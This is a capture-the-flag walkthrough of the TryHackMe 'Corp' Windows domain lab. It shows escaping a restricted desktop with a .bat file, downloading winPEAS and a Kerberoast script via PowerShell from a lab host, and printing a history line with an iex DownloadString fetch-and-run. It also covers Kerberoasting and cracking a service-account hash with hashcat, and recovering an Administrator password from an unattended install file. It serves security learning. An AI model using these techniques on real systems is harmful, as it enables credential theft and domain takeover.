# Corp


## Recon


Since we have phisical access to the machine we can try and exploit it straight up


## Exploiting


We are not admin so let's drop *linpeas.bat* to check and *priv-esc* the machine.

Aparently the system doesn't allow us to open anything like ctrl+r to find the cmd so we need to find a way.

By making a text document and saving it as `.bat` with the code inside : `start`, when we save and execute it a `cmd` will appear so now we have a bit of control

Let's download `winPEAS.bat` from my PC into the box.

```
Desktop/tryhackme/Corp                                                                                                                                                                                                                                   
▶ cp ~/Desktop/PEAS/winPEAS.bat .                  

Desktop/tryhackme/Corp                                                                                                                                                                                                                                   
▶ python3 -m http.server         
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Now we use `powershell` to download this into the box

```
C:\Users\dark\Desktop>powershell -c "Invoke-WebRequest 10.11.13.150:8000/winPEAS.bat -Outfile winPEAS.bat"
```

Now we start it and save the output to a file so we can view it inside our terminal with colored text

```
.\winPEAS.bat > out.log
```

Meanwhile we need to bypass `Applocker`, an easy way is to find whitelisted directories.


Going by the notes of the box

```
Just like Linux bash, Windows powershell saves all previous commands into a file called ConsoleHost_history. This is located at %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

Access the file and and obtain the flag.
```

We `cd` there and extract the flag

```
C:\Users\dark\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine>type ConsoleHost_history.txt
ls
dir
Get-Content test
flag{XXXXXX}
iex(new-object net.webclient).DownloadString('http://127.0.0.1/test.ps1')
cls
exit
```

Going thru the logs we find

```

_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] CURRENT SHARES <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-

Share name   Resource                        Remark

-------------------------------------------------------------------------------
C$           C:\                             Default share                     
IPC$                                         Remote IPC                        
ADMIN$       C:\Windows                      Remote Admin                      
NETLOGON     C:\Windows\SYSVOL\sysvol\corp.local\SCRIPTS
                                             Logon server share                
SYSVOL       C:\Windows\SYSVOL\sysvol        Logon server share                
The command completed successfully.
```


We can try and exploit this to get admin with the `unquoted service path` if the applocker allows us.. :/
```
C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe NT SERVICE\TrustedInstaller:(F)
C:\Program Files\Windows Media Player\wmpnetwk.exe NT SERVICE\TrustedInstaller:(F)`

```

And that was all the winPEAS info that was interesting, so let's go from here.


First we need to check the `shares`

Since we can not access them remotly using `smbclient` we will check locally.

Seems like this was a waste of time and it we didn't find anything of interest but we got our `nmap` scan results back.


```
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-07-13 15:02:57Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: corp.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: corp.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: CORP
|   NetBIOS_Domain_Name: CORP
|   NetBIOS_Computer_Name: OMEGA
|   DNS_Domain_Name: corp.local
|   DNS_Computer_Name: omega.corp.local
|   DNS_Tree_Name: corp.local
|   Product_Version: 10.0.17763
|_  System_Time: 2020-07-13T15:05:14+00:00
| ssl-cert: Subject: commonName=omega.corp.local
| Not valid before: 2020-07-12T14:21:09
|_Not valid after:  2021-01-11T14:21:09
|_ssl-date: 2020-07-13T15:05:53+00:00; +1s from scanner time.
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC

```

Now that we know there's `kerberos` we can try to exploit that


By using the command `setspn -T medin -Q */*`  we can extract all the accounts in the `spn` (service principal name)

```
C:\Windows\SYSVOL\sysvol>setspn -T medin -Q */*
Ldap Error(0x51 -- Server Down): ldap_connect
Failed to retrieve DN for domain "medin" : 0x00000051
Warning: No valid targets specified, reverting to current domain.
CN=OMEGA,OU=Domain Controllers,DC=corp,DC=local
        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/omega.corp.local
        ldap/omega.corp.local/ForestDnsZones.corp.local
        ldap/omega.corp.local/DomainDnsZones.corp.local
        TERMSRV/OMEGA
        TERMSRV/omega.corp.local
        DNS/omega.corp.local
        GC/omega.corp.local/corp.local
        RestrictedKrbHost/omega.corp.local
        RestrictedKrbHost/OMEGA
        RPC/7c4e4bec-1a37-4379-955f-a0475cd78a5d._msdcs.corp.local
        HOST/OMEGA/CORP
        HOST/omega.corp.local/CORP
        HOST/OMEGA
        HOST/omega.corp.local
        HOST/omega.corp.local/corp.local
        E3514235-4B06-11D1-AB04-00C04FC2DCD2/7c4e4bec-1a37-4379-955f-a0475cd78a5d/corp.local
        ldap/OMEGA/CORP
        ldap/7c4e4bec-1a37-4379-955f-a0475cd78a5d._msdcs.corp.local
        ldap/omega.corp.local/CORP
        ldap/OMEGA
        ldap/omega.corp.local
        ldap/omega.corp.local/corp.local
CN=krbtgt,CN=Users,DC=corp,DC=local
        kadmin/changepw
CN=fela,CN=Users,DC=corp,DC=local
        HTTP/fela
        HOST/fela@corp.local
        HTTP/fela@corp.local

Existing SPN found
```

Now we know there's another user called `fela` so let's find the password.


First we download a script from github that does this into our PC and transfer it with powershell
```
C:\Windows\System32\spool\drivers\color>powershell -c "Invoke-WebRequest 10.11.13.150:8000/roast.ps1 -Outfile roast.ps1"
```

Now we need to add a line in the file to give us hashcat output to bruteforce the password

```
C:\Windows\System32\spool\drivers\color>echo Invoke-Kerberoast -OutputFormat hashcat >> Invoke-Kerberoast.ps1

Hash                 : $krb5tgs$23$*fela$corp.local$HTTP/fela*$A39BACC43054
                       DAF334152974BE3B47B2$996B0771AD3AD11DA672526013B55D0
                       6F61EC71140ACBBD8583A94DD76F74D173A7752984C25654103A
                       7153251954F0BAE329834641C1C52AD6DFC28CEB5DB295A20189
                       7B052A3B4E45FCA5FA29A848CFEA33C514140C3994A567F8A92F
                       BD54A9635166032976BBACB083FA4A68558A571976F4DCDE12D9
                       C0798D2B20917A83757FEBE7639B40B8F34E121B5011A0FE37D8
                       3D6781E8031A9E6C12ED2B98950E3FE4AC53B6BD840256EE1D36
                       0AA1D7C0CAE15F9FAB26937A45CDEEDC1A8EE118BD5F4370B843
                       603DDD2A1C0D0EA5404EE2750EB631CA199DA0C22617DC2238E1
                       48BDDC3C5FC66F30830B0AC490FF75BACD174082E6822506D3E5
                       FB71C436669C17D28E2C1F9AEB5F3A609734C04A6A2988725457
                       4F134C7A07B31503D40AA8D1F409276A5E5DA46A7DAA167ECABE
                       C7021B14520FA2AD209CF1A29CBFED498AD77A74F3E8F4FDFE81
                       B4487842765B04F1233E9A09378EBF605F03E3D05AC5F7A5F79F
                       944C3951AB54B0CEA55BF29A2823076E7EFE24832B77B4AE155F
                       CA353D74D4FEC47DC845B24F481ABAA7C613AC0E975DC1D11211
                       8BFC6776897FD494616924228E69D28113B7BC46FCCFF7AD6447
                       91C54A7D0B1B16AE834680F8D73064BEF06790F419BE215516F4
                       FA1C6EA78F2A3FD382914964DEF59047A6D03798F4245DDC439B
                       7F3068CF73CA62C25D1CE3411054280E9DCBC1E4285E553D4B49
                       373EDB0BB9EDE80B47FD6130D1CAC6C827E2A2545A7D5403CD2A
                       D99585F8A7FB828D5E68A84AE61190310E41D1E74BAE30DA4EFA
                       6F4CF4D35E9CAC1BA0BCF9172B17D334700771A15728C9179460
                       69496EDB37CA64D37CEBCFB1A81769B058A2C4A5AA441C4FBB3E
                       F90D0B22CAFF387B6E3AFD2CFA8F339BD5061E17CF6DF8BC9CAB
                       8CA9DB63D83E51B91F6735725D98A1EB4D7064E3E74569F1F75F
                       0254B06586BE49D0ACE98FF221C33A9D78585A5A091381E980E4
                       829003D244D7E5255D7B2FD90849672684E01996F15B9C8C5532
                       5C07E9C9558412D247D66854BB2973CDCEB1297F629548BF5431
                       0C37574B8AA1D00E0D04D41792C5495A6A535FE23049E0065CAF
                       C62ABABF9C30ADF1C1C1D23BB98101D9CFE9A3A951277C67E78D
                       1E5E1CD446D3709C30298F0AA48B5FE65958FE50F2E1395B8B17
                       D2DACAFE07E805320472C41787739C2B776E124B8FD0EED38B53
                       632D88374CAD57720C5FF185615FDA386C1FFEA06A27FB3B826D
                       595FAB9F5FB88A37AEF5C1DDA8EF52E66EB898CFBEB88A3F7496
                       5A1DF082C1FDB125C6840D54932A964EAF12899E68ED793716CF
                       C9AE8EBDB9D1E7EEECFFCDE2EC58191C3822FDF15BA76B7DF2F6
                       4D8A8DCCDD2F7EC6575A1EC1447508866BC9B9E0B28C35DF360B
                       110B7F71F997E41656A60D87041B8D9
SamAccountName       : fela
DistinguishedName    : CN=fela,CN=Users,DC=corp,DC=local
ServicePrincipalName : HTTP/fela
```

Because we don't know the hash type we need first to identify before we can bruteforce. 
Because it is in such a mess we need to delete the whitespaces so we will write a simple python script to help us with that


```
with open("hash.txt", 'r') as hash:
	for l in hash:
		print(l.strip(), end="")
```

And gives us this:
```
$krb5tgs$23$*fela$corp.local$HTTP/fela*$A39BACC43054DAF334152974BE3B47B2$996B0771AD3AD11DA672526013B55D06F61EC71140ACBBD8583A94DD76F74D173A7752984C25654103A7153251954F0BAE329834641C1C52AD6DFC28CEB5DB295A201897B052A3B4E45FCA5FA29A848CFEA33C514140C3994A567F8A92FBD54A9635166032976BBACB083FA4A68558A571976F4DCDE12D9C0798D2B20917A83757FEBE7639B40B8F34E121B5011A0FE37D83D6781E8031A9E6C12ED2B98950E3FE4AC53B6BD840256EE1D360AA1D7C0CAE15F9FAB26937A45CDEEDC1A8EE118BD5F4370B843603DDD2A1C0D0EA5404EE2750EB631CA199DA0C22617DC2238E148BDDC3C5FC66F30830B0AC490FF75BACD174082E6822506D3E5FB71C436669C17D28E2C1F9AEB5F3A609734C04A6A29887254574F134C7A07B31503D40AA8D1F409276A5E5DA46A7DAA167ECABEC7021B14520FA2AD209CF1A29CBFED498AD77A74F3E8F4FDFE81B4487842765B04F1233E9A09378EBF605F03E3D05AC5F7A5F79F944C3951AB54B0CEA55BF29A2823076E7EFE24832B77B4AE155FCA353D74D4FEC47DC845B24F481ABAA7C613AC0E975DC1D112118BFC6776897FD494616924228E69D28113B7BC46FCCFF7AD644791C54A7D0B1B16AE834680F8D73064BEF06790F419BE215516F4FA1C6EA78F2A3FD382914964DEF59047A6D03798F4245DDC439B7F3068CF73CA62C25D1CE3411054280E9DCBC1E4285E553D4B49373EDB0BB9EDE80B47FD6130D1CAC6C827E2A2545A7D5403CD2AD99585F8A7FB828D5E68A84AE61190310E41D1E74BAE30DA4EFA6F4CF4D35E9CAC1BA0BCF9172B17D334700771A15728C917946069496EDB37CA64D37CEBCFB1A81769B058A2C4A5AA441C4FBB3EF90D0B22CAFF387B6E3AFD2CFA8F339BD5061E17CF6DF8BC9CAB8CA9DB63D83E51B91F6735725D98A1EB4D7064E3E74569F1F75F0254B06586BE49D0ACE98FF221C33A9D78585A5A091381E980E4829003D244D7E5255D7B2FD90849672684E01996F15B9C8C55325C07E9C9558412D247D66854BB2973CDCEB1297F629548BF54310C37574B8AA1D00E0D04D41792C5495A6A535FE23049E0065CAFC62ABABF9C30ADF1C1C1D23BB98101D9CFE9A3A951277C67E78D1E5E1CD446D3709C30298F0AA48B5FE65958FE50F2E1395B8B17D2DACAFE07E805320472C41787739C2B776E124B8FD0EED38B53632D88374CAD57720C5FF185615FDA386C1FFEA06A27FB3B826D595FAB9F5FB88A37AEF5C1DDA8EF52E66EB898CFBEB88A3F74965A1DF082C1FDB125C6840D54932A964EAF12899E68ED793716CFC9AE8EBDB9D1E7EEECFFCDE2EC58191C3822FDF15BA76B7DF2F64D8A8DCCDD2F7EC6575A1EC1447508866BC9B9E0B28C35DF360B110B7F71F997E41656A60D87041B8D9
```

We will use `John` because it has some function that when you don't specify the format it automaticly finds it for you and starts to crack it.

```
▶ sudo john hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
Proceeding with incremental:ASCII
0g 0:00:00:01  3/3 0g/s 269217p/s 269217c/s 269217C/s jaya..123710
Session aborted

```

Now we are going to crack the password using `hashcat` with the option `--force` because otherways we get an error message

```
hashcat -m 13100 -a 0 extracted_hash /usr/share/wordlists/rockyou.txt --force
```

Now that the password is cracked

```
▶ hashcat --show hash.txt -m 13100 
$krb5tgs$23$*XXXXXXXXXXXXXXXXXXX:XXXXXF124
```

We can login as `fela`



## Privilege Escalation

 
```
PS C:\Users\fela.CORP\Desktop> Import-Module .\powerup.ps1
PS C:\Users\fela.CORP\Desktop> Invoke-AllChecks
```
By running the `powerup` script `https://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/` we get some usefull information

```
[*] Checking for unattended install files...
UnattendPath : C:\Windows\Panther\Unattend\Unattended.xml
```


```
[*] Checking %PATH% for potentially hijackable .dll locations...


HijackablePath : C:\Users\fela.CORP\AppData\Local\Microsoft\WindowsApps\
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Users\fela.CORP\AppData\Lo
                 cal\Microsoft\WindowsApps\\wlbsctrl.dll' -Command '...'

```

By checking the `unattended install file` 


```
<Username>Administrator</Username>
<Value>dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=</Value>
```

After we decode that password we get the credentials.









